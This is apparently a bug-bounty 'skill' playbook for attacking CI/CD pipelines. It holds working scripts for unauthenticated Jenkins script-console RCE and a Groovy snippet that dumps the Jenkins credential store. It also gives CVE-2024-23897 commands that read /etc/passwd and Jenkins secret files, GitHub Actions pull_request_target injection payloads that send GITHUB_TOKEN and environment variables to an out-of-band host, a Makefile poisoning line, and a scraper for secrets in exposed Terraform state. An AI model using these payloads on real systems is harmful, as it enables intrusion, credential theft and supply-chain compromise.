---
name: k1nzr3c0n-hunt-cicd
description: "Hunt CI/CD pipeline vulnerabilities. Jenkins: script console RCE + CVE-2024-23897 pre-auth file read → forge admin. GitHub Actions: pull_request_target Pwnrequest (${{ }}-into-shell injection + poisoned checkout), self-hosted runner poisoning, OIDC trust-policy abuse. Terraform state file leakage. GitLab CI runner registration."
tags: [cicd, jenkins, github-actions, terraform, hunt, web-security, bug-bounty]
---

# K1NZR3C0N Hunt — CI/CD Pipeline Security

> **Crown jewel**: Jenkins /script console unauthenticated = immediate RCE.
> **Proof gate**: a login page at /script is NOT an RCE. Only POST returning command output counts.

---

## "It-Didn't-Happen" Gate (Read First)

```
1. A reachable /script URL returning login page = NOT an RCE
2. pull_request_target workflow = NOT injectable unless data flows into execution sink
3. Blind injection MUST have OOB callback (unique interactsh subdomain per sink)
4. .tfstate HTTP 200 = NOT cred exposure until you parse and find actual secrets
```

## Phase 0 — Detect CI/CD

```bash
TARGET="${TARGET:-}"
ORG="${ORG:-$(echo $TARGET | cut -d. -f1)}"
HUNT="/tmp/hunt_cicd_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"
OOB="${OOB:-$(openssl rand -hex 4).oastify.com}"

echo "=== CI/CD Endpoint Detection ==="
for EP in /jenkins /jenkins/login /ci /build /pipeline /.github/workflows /gitlab /drone /argo /teamcity; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://${TARGET}${EP}")
  [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "  [$CODE] ${EP}"
done

# Jenkins version fingerprint
curl -sI "https://${TARGET}/" | grep -iE 'x-jenkins|x-hudson' | sed 's/^/  [JENKINS] /'
```

## Phase 1 — Jenkins: Script Console + CVE-2024-23897

```bash
echo "=== Jenkins Script Console ==="
BASE="${JENKINS_BASE:-https://${TARGET}}"

# Check script console accessibility
for PATH_J in /script /scriptText /jenkins/script /jenkins/scriptText /ci/script; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "${BASE}${PATH_J}")
  echo "  $PATH_J → $CODE"
done

echo ""
echo "Unauthenticated RCE test (MUST return uid=...jenkins, not HTML login page):"
RESP=$(curl -sk -X POST "${BASE}/scriptText" \
  --data-urlencode 'script=println "id".execute().text')
echo "$RESP" | grep -oP 'uid=[0-9]+[^$]+' | head -1 | sed 's/^/  [RCE] /'
echo "$RESP" | head -2 | sed 's/^/  RESP: /'

echo ""
echo "Dump credential store (if script console accessible):"
cat << 'GROOVY'
import com.cloudbees.plugins.credentials.CredentialsProvider
import com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials
import org.jenkinsci.plugins.plaincredentials.StringCredentials
CredentialsProvider.lookupCredentials(StandardUsernamePasswordCredentials, jenkins.model.Jenkins.instance).each {
  println "${it.id} :: ${it.username} :: ${it.password}"
}
CredentialsProvider.lookupCredentials(StringCredentials, jenkins.model.Jenkins.instance).each {
  println "${it.id} :: ${it.secret}"
}
GROOVY

echo ""
echo "=== CVE-2024-23897 (Jenkins CLI File Read, ≤2.441) ==="
echo "Download jenkins-cli.jar from: https://${TARGET}/jnlpJars/jenkins-cli.jar"
echo "Then:"
echo "  java -jar jenkins-cli.jar -s https://${TARGET}/ -http connect-node '@/etc/passwd'"
echo "  java -jar jenkins-cli.jar -s https://${TARGET}/ -http connect-node '@/var/lib/jenkins/secret.key'"
echo "  java -jar jenkins-cli.jar -s https://${TARGET}/ -http connect-node '@/var/lib/jenkins/credentials.xml'"
echo "  Validation: response must contain file content lines, not just 'no such agent'"
```

## Phase 2 — GitHub Actions Pwnrequest

```bash
echo "=== GitHub Actions: Pwnrequest Detection ==="
echo "Scan public org workflows for dangerous triggers:"
echo ""
echo "  gh api graphql -f query='{organization(login:\"${ORG}\"){repositories(first:100){nodes{name}}}}'"
echo "  | then check each .github/workflows/*.yml for:"
echo "    - trigger: pull_request_target OR workflow_run"
echo "    - AND: checkout of PR head ref"
echo "    - AND: \${{ github.event.pull_request.title }} or similar in shell run:"
echo ""
echo "Vulnerable pattern (injection via PR title):"
cat << 'YAML'
on: pull_request_target          # runs with write token + secrets on fork PRs
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with: { ref: "${{ github.event.pull_request.head.sha }}" }  # checks out attacker code
      - run: echo "Building ${{ github.event.pull_request.title }}"  # ← INJECTION POINT
YAML

echo ""
echo "Attack: set PR title to:"
echo '  a"; curl "https://OOB/?t=$(printenv GITHUB_TOKEN | base64)"; echo "'
echo ""
echo "Or for newline injection in multi-line YAML run:"
echo "  PR title: foo\ncurl https://OOB/?d=\$(printenv | base64 -w0)"

echo ""
echo "For poisoned checkout (no \${{ }} needed — Makefile or package.json preinstall in PR):"
echo '  echo "curl -s https://OOB/?env=\$(printenv | base64 -w0)" >> Makefile'
```

## Phase 3 — Terraform State Leakage

```bash
echo "=== Terraform State File Leakage ==="

for URL in \
  "https://${ORG}.s3.amazonaws.com/terraform.tfstate" \
  "https://s3.amazonaws.com/${ORG}-tfstate/terraform.tfstate" \
  "https://${ORG}-infra.s3.amazonaws.com/env/prod/terraform.tfstate" \
  "https://storage.googleapis.com/${ORG}-tfstate/default.tfstate" \
  "https://${ORG}.blob.core.windows.net/tfstate/terraform.tfstate"; do
  CODE=$(curl -sk -o /tmp/tf.json -w "%{http_code}" "$URL" -m 10)
  if [ "$CODE" = "200" ]; then
    echo "  [HIT] $URL"
    python3 -c "
import json, sys
try:
    d = json.load(open('/tmp/tf.json'))
    for r in d.get('resources', []):
        for i in r.get('instances', []):
            for k, v in i.get('attributes', {}).items():
                if any(x in k.lower() for x in ['password', 'secret', 'private_key', 'token', 'access_key']):
                    print(f'  SECRET: {k} = {str(v)[:80]}')
except: pass
" 2>/dev/null
  fi
done
```

## Gate 0

```bash
echo "=== CI/CD Gate 0 ==="
echo "  □ Jenkins: POST /scriptText returns 'id' output (not HTML login)"
echo "  □ CVE-2024-23897: file content lines in CLI response"
echo "  □ Pwnrequest: OOB callback with GITHUB_TOKEN value received"
echo "  □ Self-hosted runner: confirmed code execution on runner host (OOB)"
echo "  □ Terraform: actual secret values parsed from .tfstate"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
Jenkins script console RCE on [jenkins.target.com/script]: unauthenticated POST /scriptText executes 'id' → uid=111(jenkins); credential store dump reveals 5 API keys and DB passwords
CVE-2024-23897 on [jenkins.target.com] (Jenkins 2.387.1): java -jar jenkins-cli.jar connect-node @/etc/passwd returns /etc/passwd content pre-auth
GitHub Actions pull_request_target injection: workflow checks out PR head + reflects ${{ github.event.pull_request.title }} in shell run → fork PR with crafted title exfils GITHUB_TOKEN (contents:write scope)
```
